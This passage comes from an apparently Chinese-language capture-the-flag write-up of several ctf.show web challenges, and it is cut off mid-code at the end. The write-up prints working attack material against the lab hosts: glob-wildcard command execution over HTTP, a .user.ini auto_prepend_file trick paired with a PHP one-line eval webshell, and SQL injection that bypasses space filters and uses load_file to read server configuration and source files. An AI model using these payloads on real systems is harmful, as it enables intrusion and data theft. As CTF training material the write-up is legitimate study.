<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cmd=?&gt;&lt;?=`.+/???/p?p??????`;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>61f8ba71-d383-4585-b013-7fe10f2ba250.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>296</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">#! /bin/sh</span></span><br><span class="line"><span class="language-pgsql">whoami</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>

<p>这里如果是全部问号的话感觉匹配不上我们上传的文件，刚好漏了个字母p，应该就是这里用的</p>
<p>接着改文件内容进行rce就行</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/?cmd=?&gt;&lt;?=`.+/???/p?p??????`;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>61f8ba71-d383-4585-b013-7fe10f2ba250.challenge.ctf.show</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>303</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>null</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryiKHEKB03McUcMv6w</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;file&quot;; filename=&quot;1.txt&quot;</span></span><br><span class="line"><span class="language-pgsql">Content-<span class="keyword">Type</span>: <span class="type">text</span>/plain</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">#! /bin/sh</span></span><br><span class="line"><span class="language-pgsql">cat /flag.txt</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w</span></span></span><br><span class="line"><span class="language-pgsql">Content-Disposition: form-data; <span class="type">name</span>=&quot;submit&quot;</span></span><br><span class="line"><span class="language-pgsql"></span></span><br><span class="line"><span class="language-pgsql">提交</span></span><br><span class="line"><span class="language-pgsql"><span class="comment">------WebKitFormBoundaryiKHEKB03McUcMv6w--</span></span></span><br><span class="line"><span class="language-pgsql"></span></span><br></pre></td></tr></table></figure>

<h2 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h2><h3 id="user-ini文件上传"><a href="#user-ini文件上传" class="headerlink" title="#.user.ini文件上传"></a>#.user.ini文件上传</h3><p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308221344911.png" alt="image-20250308221344911"></p>
<p>传了一个一句话木马显示大小错误，扫目录看到一个&#x2F;upload.php</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308221515074.png" alt="image-20250308221515074"></p>
<p>访问也没啥，后面看wp才知道这里有备份文件源码泄露，可能是题目做少了 没这种思路</p>
<p>访问upload.php.bak下载源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">	<span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">	<span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line">	<span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">	<span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>正则匹配</p>
<ul>
<li>文件的大小 &gt; 24（error file zise）</li>
<li>文件名的长度 &gt; 9（error file name）</li>
<li>后缀名的长度 &gt; 3（error suffix）</li>
<li>后缀名包含 php（error suffix）</li>
<li>文件名包含 php（error file name）</li>
</ul>
<p>我们肯定是要上传一句话木马的，既然小于等于24可以这样写<code>&lt;?php eval($_POST[&#39;a&#39;]);</code>正好24字节可以满足，但是由于后缀问题服务器无法解析该php语句。</p>
<p>一个新的知识点，利用.user.ini去包含我们的一句话木马</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308231722174.png" alt="image-20250308231722174"></p>
<p>我们要上传一个.user.ini文件，.user.ini 是 PHP 的用户级配置文件。这个文件允许用户在特定目录中自定义一些 PHP 配置选项，以覆盖全局 PHP 配置。</p>
<p>PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。也就是在.user.ini中如果设置了文件名，那么任意一个页面都会将该文件中的内容包含进去。</p>
<p>我们在.user.ini中输入<code>auto_prepend_file =a.txt</code>，这样在该目录下的所有文件都会包含a.txt的内容</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.user.ini的内容</span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.txt</span><br></pre></td></tr></table></figure>

<p>然后编辑a.txt写一句话木马就行，这里要记得文件的内容大小问题</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>然后在当前路径下进行post传参，应该是权限的问题，连马后操作不了</p>
<p>使用函数套用去看一下当前目录的文件</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250308231126489.png" alt="image-20250308231126489"></p>
<p>再用highlight_file去读文件就行</p>
<h2 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h2><h3 id="无列名注入-mysql读取文件"><a href="#无列名注入-mysql读取文件" class="headerlink" title="#无列名注入+mysql读取文件"></a>#无列名注入+mysql读取文件</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;secret.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">sleep</span>(<span class="variable">$c</span>);</span><br><span class="line">    <span class="keyword">switch</span> (<span class="variable">$c</span>) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$url&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;@A@&quot;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">222</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3333</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">44444</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">555555</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$url</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6000000</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$url</span>&quot;</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;@A@&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>在代码中可以看到传入3的话由于case3后面没有break，所以他会继续往下执行，然后就会回显出$url参数的值，但是这里是带引号的，意思是不会返回url的内容</p>
<p>对于php，单引号包裹的内容只能当做纯字符串, 而双引号包裹的内容, 可以识别变量, 所以源码中的 “$url” 可以当做 $url 变量被正常执行</p>
<p>传入3后返回url的值是here_1s_your_f1ag.php，访问这个文件出现一个查询页面</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310151921904.png" alt="image-20250310151921904"></p>
<p>用单引号闭合就看到弹窗没内容了，应该是存在sql注入的，后面测出来如果输入非法字符的话就没得弹窗，如果语句成功执行就会返回admin弹窗</p>
<p>可以先fuzz一下</p>
<p>在返回包中看到一个正则匹配</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/information_schema\.tables|information_schema\.columns|linestring| |polygon/is&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;query&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;@A@&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>information_schema库被禁了，看看能不能打无列名注入</p>
<p>看一下语句错误和语句正确的回显</p>
<p><img src="/../image/achieve/202411/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982020/image-20250310152821259.png" alt="image-20250310152821259"></p>
<p>这是语句错误的时候的回显</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310153039724.png" alt="image-20250310153039724"></p>
<p>语句正确的回显</p>
<p>同时过滤了空格</p>
<p>传入<code>1/**/or/**/true</code>回显admin弹窗，用<code>/**/</code>可以绕过空格</p>
<p>所以这里的话应该是要打无列名注入</p>
<p>先测一下字段数</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="comment">/**/</span><span class="keyword">order</span><span class="comment">/**/</span><span class="keyword">by</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">---------传入2报错，字段数为1</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span><span class="comment">---------回显1(注意这里要填-1才会返回1的结果，不然返回位置会被1的查询结果占据)</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">database</span>()<span class="comment">-----回显web,当前数据库为web</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(<span class="built_in">table_name</span>)<span class="keyword">from</span><span class="comment">/**/</span>mysql.innodb_table_stats<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>database_name=<span class="string">&#x27;web&#x27;</span>)<span class="comment">---------回显content表名，这里使用了innodb_table_stats获取表名</span></span><br><span class="line">利用<span class="keyword">union</span>别名查询每列的数据</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(`<span class="number">1</span>`)<span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>content)<span class="keyword">as</span><span class="comment">/**/</span>a) <span class="comment">------1,1,2,3</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(`<span class="number">2</span>`)<span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>content)<span class="keyword">as</span><span class="comment">/**/</span>a) <span class="comment">------2,admin,gtf1y,Wow</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>group_concat(`<span class="number">3</span>`)<span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>content)<span class="keyword">as</span><span class="comment">/**/</span>a)<span class="comment">---3,flag is not here!,wow,you can really dance,tell you a secret,secret has a secret...</span></span><br></pre></td></tr></table></figure>

<p>Flag 不在数据库中，可能还得mysql读取敏感文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">先看一下数据库用户名是什么</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="keyword">user</span>()<span class="comment">------root@localhost</span></span><br><span class="line">意味着我们可以用root用户高权限使用MySQL进行命令执行</span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>load_file(&quot;/etc/nginx/nginx.conf&quot;)<span class="comment">------通过root /var/www/html;：知道了网页根目录</span></span><br><span class="line"><span class="number">-1</span><span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>load_file(&quot;/var/www/html/secret.php&quot;)<span class="comment">----结合一开始题目的include代码，试着读取目录下的secret.php文件</span></span><br></pre></td></tr></table></figure>

<p>读取后返回一段代码</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="comment">&lt;!-- ReadMe --&gt;</span></span></span><br><span class="line"><span class="language-xml"></span><span class="language-php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="language-php"><span class="variable">$url</span> = <span class="string">&#x27;here_1s_your_f1ag.php&#x27;</span>;</span></span><br><span class="line"><span class="language-php"><span class="variable">$file</span> = <span class="string">&#x27;/tmp/gtf1y&#x27;</span>;</span></span><br><span class="line"><span class="language-php"><span class="keyword">if</span>(<span class="title function_ invoke__">trim</span>(@<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>)) === <span class="string">&#x27;ctf.show&#x27;</span>)&#123;</span></span><br><span class="line"><span class="language-php">	<span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/real_flag_is_here&#x27;</span>);</span></span><br><span class="line"><span class="language-php">&#125;</span></span><br></pre></td></tr></table></figure>

<p>直接读取目录下的real_flag_is_here</p>
<h2 id="红包题第六弹"><a href="#红包题第六弹" class="headerlink" title="红包题第六弹"></a>红包题第六弹</h2><h3 id="强碰撞-文件竞争"><a href="#强碰撞-文件竞争" class="headerlink" title="#强碰撞+文件竞争"></a>#强碰撞+文件竞争</h3><p>1.不是SQL注入 2.需要找关键源码</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310173523034.png" alt="image-20250310173523034"></p>
<p>随便传入字符显示md5 error，一开始猜测是对用户名或者对密码的md5加密，尝试闭合括号后发现无果，只能另寻出路</p>
<p>用dirsearch扫目录后找到一个web.zip文件</p>
<p><img src="/../image/achieve/202411/ctfshow--web%E4%B8%93%E9%A2%98/image-20250310192755074.png" alt="image-20250310192755074"></p>
<p>访问后下载压缩包，拿到check.php的源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">receiveStreamFile</span>(<span class="params"><span class="variable">$receiveFile</span></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$streamData</span> = <span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>])? <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_RAW_POST_DATA&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$streamData</span>))&#123;</span><br><span class="line">        <span class="variable">$streamData</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$streamData</span>!=<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$receiveFile</span>, <span class="variable">$streamData</span>, <span class="literal">true</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">date</span>(<span class="string">&quot;i&quot;</span>)) === <span class="variable">$token</span>)&#123;<span class="comment">//时间分钟数的MD5加密是否为$token值</span></span><br><span class="line">	</span><br><span class="line">	<span class="variable">$receiveFile</span> = <span class="string">&#x27;flag.dat&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">receiveStreamFile</span>(<span class="variable">$receiveFile</span>);<span class="comment">//接收数据流并写入flag.dat文件</span></span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">md5_file</span>(<span class="variable">$receiveFile</span>)===<span class="title function_ invoke__">md5_file</span>(<span class="string">&quot;key.dat&quot;</span>))&#123;<span 